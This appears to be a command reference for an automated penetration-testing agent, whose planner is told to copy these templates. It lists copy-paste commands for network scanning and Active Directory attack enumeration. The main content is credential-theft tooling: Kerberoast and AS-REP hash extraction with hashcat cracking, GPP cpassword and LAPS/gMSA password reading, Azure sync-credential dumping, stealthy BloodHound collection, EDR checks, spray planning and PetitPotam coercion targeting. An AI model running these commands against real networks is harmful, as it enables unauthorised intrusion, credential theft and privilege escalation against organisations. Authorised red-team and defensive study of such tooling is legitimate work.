# Discovery — tool commands reference

Concrete, copy-pasteable commands for every step of `SKILL.md`. The planner
must produce `command_template` strings that look like these — same flags,
same outputs, just with the placeholders substituted from `foothold` or
session memory.

**Global substitution key**

| Placeholder        | Source                              |
|--------------------|-------------------------------------|
| `<CIDR>`           | `network.cidr`                      |
| `<DC_IP>`          | `network.dc_ip`                     |
| `<DOMAIN>`         | `domain.name`                       |
| `<USER>`           | `creds.domain_user`                 |
| `<PASS>`           | `creds.domain_pass`                 |
| `<ARTIFACTS>`      | per-stage artifact directory        |
| `<LIVE_HOSTS_FILE>`| one-IP-per-line file from Step 4    |

---

## Phase A — Network Discovery

### Step 1 — Determine local network range

#### Windows (`cmd`)

```
ipconfig /all
route print -4
```

Parse the primary adapter's `IPv4 Address` + `Subnet Mask` into a CIDR.
Store as `network.cidr`.

#### Linux / macOS (`sh`)

```
ip -o -4 addr show
ip route
```

Parse the `inet a.b.c.d/NN` field. Store as `network.cidr`.

---

### Step 2 — Confirm nmap is installed

#### Windows (`cmd`)

```
nmap --version || where nmap
```

#### Linux / macOS (`sh`)

```
nmap --version || command -v nmap
```

Non-zero exit on both → `recon.nmap_available = false` → trigger Step 3.

---

### Step 3 — Install nmap (only if missing)

#### Windows (`cmd`, admin)

```
winget install -e --id Insecure.Nmap --silent --accept-package-agreements --accept-source-agreements && nmap --version
```

Chocolatey fallback:

```
choco install nmap -y && nmap --version
```

#### Debian / Ubuntu (`sh`)

```
sudo apt-get update && sudo apt-get install -y nmap && nmap --version
```

#### RHEL / CentOS / Fedora (`sh`)

```
sudo dnf install -y nmap && nmap --version
```

#### macOS (`sh`)

```
brew install nmap && nmap --version
```

If no package manager is reachable → emit `recommended_next = blocked`.

---

### Step 4 — Host discovery sweep

```
nmap -sn -PE -PP -PS21,22,80,443,445,3389 -PA80,443,3389 \
     -oA <ARTIFACTS>/nmap_hostsweep <CIDR>
```

Parse the `.gnmap` output for `Status: Up` lines. Persist each IP (plus reverse-DNS
hostname where present) into `network.live_hosts`.

If sweep returns zero hosts, re-run **once** with ARP fallback:

```
nmap -sn -PR -oA <ARTIFACTS>/nmap_hostsweep_arp <CIDR>
```

---

### Step 5 — Service / port enumeration

Build a one-IP-per-line file from `network.live_hosts` before running:

```
nmap -sS -sV -Pn --top-ports 1000 --version-intensity 5 \
     -oA <ARTIFACTS>/nmap_services -iL <LIVE_HOSTS_FILE>
```

Flag rationale:

| Flag | Purpose |
|------|---------|
| `-sS` | SYN scan — fast, low footprint (requires root/Administrator). Non-privileged: substitute `-sT`. |
| `-sV` | Service + version detection (mandatory — feeds DC gate). |
| `-Pn` | Skip re-ping (Step 4 already confirmed live hosts). |
| `--top-ports 1000` | Broad coverage without full 65535 scan. |
| `--version-intensity 5` | Default. Raise to 7 for stubborn banners; never 9 on a full sweep. |

Persist each `(host, port, proto, service, product, version)` row into `network.services`.

---

### Step 6 — Targeted deepening

Run one ability stage per high-value port. Never broaden the port list beyond what
was observed in Step 5.

| Port | Service  | Command |
|------|----------|---------|
| 445  | SMB      | `nmap -p445 --script smb-os-discovery,smb2-security-mode <IP>` |
| 88   | Kerberos | `nmap -p88 -sV <IP>` |
| 389  | LDAP     | `nmap -p389 --script ldap-rootdse <IP>` |
| 636  | LDAPS    | `nmap -p636 --script ldap-rootdse,ssl-cert <IP>` |
| 3389 | RDP      | `nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info <IP>` |
| 80   | HTTP     | `nmap -p80 --script http-title,http-server-header,http-methods <IP>` |
| 443  | HTTPS    | `nmap -p443 --script http-title,http-server-header,ssl-cert <IP>` |
| 22   | SSH      | `nmap -p22 --script ssh2-enum-algos,ssh-hostkey <IP>` |
| 3306 | MySQL    | `nmap -p3306 --script mysql-info <IP>` |
| 1433 | MSSQL    | `nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info <IP>` |

Persist script output under `network.fingerprints.<IP>.<PORT>`.

---

### Step 7 — DC gate probe

Only emit these abilities after the gate condition passes (see `SKILL.md § Step 7`).
These are unauthenticated and lightweight.

```
netexec smb <DC_IP>
ldapsearch -x -H ldap://<DC_IP> -s base -b "" \
    namingContexts defaultNamingContext dnsHostName \
    domainFunctionality forestFunctionality
enum4linux-ng -A <DC_IP>
```

Persist domain name, NetBIOS name, naming contexts, functional level, and SMB signing
flag under `identity.domain`. Set `network.has_domain_controller = true` and emit
`recommended_next` per `SKILL.md § Pivot conditions`.

---

## Phase B — Active Directory Enumeration

### Step 8 — Lightweight unauthenticated DC probe (D11)

```
netexec smb <DC_IP>
ldapsearch -x -H ldap://<DC_IP> -s base -b "" \
    namingContexts defaultNamingContext dnsHostName \
    domainFunctionality forestFunctionality
enum4linux-ng -A <DC_IP>
```

Save: `domain.name`, `domain.dc_hostname`, `domain.functional_level`,
`domain.smb_signing_required` (flag `false` as NTLM relay target).

---

### Step 9 — BloodHound full collection (D1)

#### Domain-joined Windows

```
SharpHound.exe -c All --stealth --zipfilename bh_out.zip
SharpHound.exe -c All,GPOLocalGroup,LoggedOn -d <DOMAIN>
```

#### Linux / credentialled

```
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -c all -ns <DC_IP>
```

#### Azure / hybrid tenant

```
azurehound -u <UPN> -p '<PASS>' list --tenant <TENANT_ID> \
    -o <ARTIFACTS>/bloodhound/azurehound.json
```

#### BloodHound GUI queries to run after ingest

```cypher
-- Shortest Paths to Domain Admins
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p

-- Find All Domain Admin Sessions
MATCH (u:User)-[:HasSession]->(c:Computer) WHERE u.admincount=true RETURN u,c

-- Find Principals with DCSync Rights
MATCH (u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN u,d
```

---

### Step 10 — DC / FSMO role discovery (D11)

```
nltest /dclist:<DOMAIN>
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
powershell "Get-ADDomainController -Filter * | Select Name,IPv4Address,Roles"
netexec smb <DC_IP> --gen-relay-list <ARTIFACTS>/relay_targets.txt
```

---

### Step 11 — Domain user & group enumeration (D6)

```
ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' ldap://<DC_IP> \
    -o <ARTIFACTS>/ldapdump
windapsearch -d <DC_IP> -u <USER>@<DOMAIN> -p <PASS> \
    --module users -o <ARTIFACTS>/windap_users.json
powershell "Get-ADUser -Filter * -Properties * | Export-Csv <ARTIFACTS>/ad_users.csv"
powershell "Get-ADGroup -Filter * | Get-ADGroupMember -Recursive | \
    Export-Csv <ARTIFACTS>/ad_groups.csv"
```

---

### Step 12 — Password policy discovery (D15)

**Always run before any spray. Gate: abort spray planning if lockout threshold ≤ 3.**

```
netexec smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol
powershell "(Get-ADDefaultDomainPasswordPolicy).LockoutThreshold"
powershell "Get-DomainPolicy | select -ExpandProperty SystemAccess"
net accounts /domain
powershell "Get-ADFineGrainedPasswordPolicy -Filter * | \
    select Name,LockoutThreshold,LockoutObservationWindow"
```

Parse into memory:
- `domain.password_policy.lockout_threshold` → max safe attempts = threshold − 1
- `domain.password_policy.observation_window_min` → spray interval = window + 5 min buffer

---

### Step 13 — DNS enumeration (D13)

```
adidnsdump -u '<DOMAIN>\<USER>' -p '<PASS>' <DC_IP> \
    --print-zones -o <ARTIFACTS>/adidns.csv
dnsx -l <ARTIFACTS>/ad_hosts.txt -a -resp -o <ARTIFACTS>/dns_resolved.txt
nslookup -type=ANY <DOMAIN> <DC_IP>
netexec smb <CIDR> --gen-relay-list <ARTIFACTS>/ntlm_relay_targets.txt
powershell "Get-DnsServerResourceRecord -ZoneName <DOMAIN> -ComputerName <DC_IP>"
```

---

### Step 14 — Forest & trust mapping (D7)

```
powershell "Get-DomainTrust | select SourceName,TargetName,TrustType,TrustDirection,TrustAttributes"
powershell "Get-ForestDomain | select Name"
powershell "Invoke-MapDomainTrust | Export-CSV <ARTIFACTS>/trusts.csv"
```

---

### Step 15 — ACL / permission abuse discovery (D2)

```
powershell "Get-DomainObjectAcl -ResolveGUIDs | \
    ?{$_.ActiveDirectoryRights -match 'GenericAll|WriteDACL|WriteOwner|ForceChangePassword'}"
powershell "Find-InterestingDomainAcl -ResolveGUIDs | \
    select IdentityReferenceName,ObjectDN,ActiveDirectoryRights"
# From Linux
daclenum.py -u <USER> -p '<PASS>' -d <DOMAIN> <DC_IP>
# BloodHound: click controlled user → Outbound Object Control
adaclscanner -outputpath <ARTIFACTS>/adacls -domain <DOMAIN> \
    -server <DC_IP> -username <USER> -password '<PASS>'
```

---

### Step 16 — Kerberoastable & AS-REP roastable discovery (D9)

#### Kerberoast (requires one domain user)

```
powershell "Get-DomainUser -SPN | select samaccountname,serviceprincipalname,admincount"
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /outfile:<ARTIFACTS>/kerberoast.txt /nowrap
# Target a specific high-value SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/db01.<DOMAIN>:1433 /nowrap
# From Linux
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> \
    -outputfile <ARTIFACTS>/kerberoast_hashes.txt
```

#### AS-REP roast (no credentials required for user list)

```
powershell "Get-DomainUser -PreauthNotRequired | select samaccountname"
# From Linux — zero creds needed
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt
impacket-GetNPUsers '<DOMAIN>/' -usersfile <ARTIFACTS>/ad_userlist.txt \
    -no-pass -format hashcat -outputfile <ARTIFACTS>/asrep_hashes.txt
```

#### Crack offline

```
hashcat -m 13100 <ARTIFACTS>/kerberoast_hashes.txt rockyou.txt --force    # RC4 Kerberoast
hashcat -m 18200 <ARTIFACTS>/asrep_hashes.txt rockyou.txt --force          # AS-REP
```

---

### Step 17 — Delegation discovery (D16)

```
impacket-findDelegation '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
powershell "Get-ADComputer -Filter {TrustedForDelegation -eq $true} \
    -Properties TrustedForDelegation"
powershell "Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} \
    -Properties msDS-AllowedToDelegateTo"
powershell "Get-ADComputer -Filter * \
    -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | \
    Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}"
```

---

### Step 18 — GPO enumeration (D10)

```
powershell "Get-GPO -All | Select DisplayName,Id,GpoStatus | \
    Export-Csv <ARTIFACTS>/gpos.csv"
group3r.exe -f <ARTIFACTS>/group3r_output.txt
powershell "Import-Module .\PowerView.ps1; Get-DomainGPO | \
    Get-DomainGPOLocalGroup | Export-Csv <ARTIFACTS>/gpo_local_groups.csv"
```

---

### Step 19 — AD CS vulnerability discovery (D3)

```
# Certipy (Linux, preferred)
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \
    -output <ARTIFACTS>/adcs -vulnerable -enabled

# Certify (Windows)
Certify.exe find /vulnerable
Certify.exe find /enrolleeSuppliesSubject

# ESC8: check if web enrollment is running
curl http://<CA_HOST>/certsrv/
```

---

### Step 20 — SMB & network share enumeration (D4)

```
netexec smb <CIDR> -u <USER> -p '<PASS>' --shares \
    > <ARTIFACTS>/nxc_shares.txt
powershell "Invoke-ShareFinder -CheckShareAccess | Out-File <ARTIFACTS>/shares.txt"
powershell "Find-InterestingDomainShareFile -Include *.xml,*.config,*.ps1,*.bat,*.vbs"
# Check SYSVOL for GPP cpassword values
findstr /S /I cpassword \\<DOMAIN>\sysvol\*.xml
powershell "Get-GPPPassword"
Snaffler.exe -s -o <ARTIFACTS>/snaffler.log -v data
```

---

### Step 21 — Logged-on user & admin session hunting (D5)

```
powershell "Find-DomainUserLocation -UserGroupIdentity 'Domain Admins'"
powershell "Get-NetLoggedon -ComputerName <DC_HOSTNAME>"
powershell "Get-NetSession -ComputerName <FILESERVER>"
powershell "Invoke-UserHunter -CheckAccess -Stealth"
netexec smb <LIVE_HOSTS_FILE> -u <USER> -p '<PASS>' \
    --loggedon-users --admin-count > <ARTIFACTS>/nxc_sessions.txt
```

---

### Step 22 — Process & service discovery (D12)

```
Seatbelt.exe -group=all -outputfile=<ARTIFACTS>/seatbelt.txt
winpeas.exe > <ARTIFACTS>/winpeas.txt 2>&1
whoami /all
systeminfo | findstr /B /C:"OS" /C:"Domain"
# AV / EDR check
sc query | findstr /i "defender\|crowdstrike\|carbon\|sentinel\|cylance"
Get-MpComputerStatus
net localgroup administrators
netstat -ano | findstr LISTENING
tasklist /v /fo csv > <ARTIFACTS>/tasklist.csv
sc query type= all state= all > <ARTIFACTS>/services.txt
wmic process get Caption,CommandLine,ProcessId > <ARTIFACTS>/wmic_procs.csv
```

Interpret `whoami /all` privileges:
- `SeImpersonatePrivilege` → Potato attacks (`escalating-privileges`)
- `SeBackupPrivilege` → can read NTDS.dit
- `SeDebugPrivilege` → can attach to LSASS

---

### Step 23 — Azure AD / hybrid enumeration (D14)

```
roadrecon gather -u <USER>@<DOMAIN> -p '<PASS>' -d <ARTIFACTS>/roadtools.db
roadrecon dump -d <ARTIFACTS>/roadtools.db
# AADInternals (PowerShell)
Import-Module AADInternals
Get-AADIntTenantDetails | ConvertTo-Json > <ARTIFACTS>/aad_tenant.json
Get-AADIntSyncCredentials
```

---

### Step 24 — LAPS & gMSA reader discovery (D20)

```
LAPSToolkit\Get-LAPSComputers | Export-Csv <ARTIFACTS>/laps_computers.csv
LAPSToolkit\Find-LAPSDelegatedGroups | Export-Csv <ARTIFACTS>/laps_readers.csv
powershell "Get-DomainComputer -Filter {ms-Mcs-AdmPwd=*} \
    -Properties ms-Mcs-AdmPwd,name"
netexec ldap <DC_IP> -u <USER> -p '<PASS>' -M laps \
    > <ARTIFACTS>/nxc_laps.txt
powershell "Get-ADServiceAccount -Filter * \
    -Properties PrincipalsAllowedToRetrieveManagedPassword | \
    Export-Csv <ARTIFACTS>/gmsa.csv"
```

---

### Step 25 — MSSQL enumeration (D17)

Only if TCP/1433 or TCP/1434 found in Step 5.

```
powershell "Get-SQLInstanceDomain | Get-SQLConnectionTest | \
    Where-Object {$_.Status -eq 'Accessible'} | \
    Get-SQLServerInfo | Export-Csv <ARTIFACTS>/mssql_servers.csv"
powershell "Get-SQLInstanceDomain | Get-SQLServerLinkCrawl | \
    Export-Csv <ARTIFACTS>/mssql_links.csv"
netexec mssql <MSSQL_HOST> -u <USER> -p '<PASS>' \
    > <ARTIFACTS>/nxc_mssql.txt
```

---

### Step 26 — Exchange / mail enumeration (D18)

Only if OWA banner / TCP/25 / TCP/587 found in Step 5.

```
netexec smb <EXCHANGE_HOST> -u <USER> -p '<PASS>' \
    -M spider_plus > <ARTIFACTS>/nxc_exchange_spider.txt
ruler --domain <DOMAIN> --username <USER> --password '<PASS>' \
    abk list > <ARTIFACTS>/ruler_contacts.txt
powershell "Invoke-GlobalMailSearch -ImpersonationAccount <USER> \
    -ExchHostname <EXCHANGE_HOST> -OutputCsv <ARTIFACTS>/mail_search.csv"
```

---

### Step 27 — Printer & spooler discovery (D19)

Only if TCP/445 + TCP/135 found on non-DC hosts in Step 5.

```
netexec smb <LIVE_HOSTS_FILE> -u <USER> -p '<PASS>' \
    -M spooler > <ARTIFACTS>/nxc_spooler.txt
netexec smb <LIVE_HOSTS_FILE> -u <USER> -p '<PASS>' \
    -M petitpotam > <ARTIFACTS>/nxc_petitpotam.txt
```

Hosts with spooler enabled + unconstrained delegation found in Step 17 →
coercion targets for `moving-laterally`.
